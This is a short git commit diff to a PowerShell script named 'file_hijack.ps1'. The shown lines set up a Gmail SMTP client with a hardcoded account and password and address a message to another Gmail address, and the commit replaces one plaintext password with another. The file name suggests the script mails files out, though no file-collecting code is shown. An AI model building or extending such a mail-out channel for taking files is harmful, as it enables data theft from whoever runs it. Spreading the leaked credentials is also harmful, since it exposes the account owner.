909678c5427b6be98095a549801f2dc5d776f253
Subhranshu Choudhury <63858190+subhranshuchoudhury@users.noreply.github.com>
2022-01-07 01:31:38 +0530

    Update file_hijack.ps1

--- file_hijack.ps1
+++ file_hijack.ps1
@@ -1,6 +1,6 @@
 $Message = new-object Net.Mail.MailMessage 
 $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587) 
-$smtp.Credentials = New-Object System.Net.NetworkCredential("testsubhranshu00@gmail.com", "qwerty@1234"); 
+$smtp.Credentials = New-Object System.Net.NetworkCredential("testsubhranshu00@gmail.com", "password"); 
 $smtp.EnableSsl = $true   
 $Message.From = "testsubhranshu00@gmail.com" 
 $Message.To.Add("subhransuchoudhury00@gmail.com") 
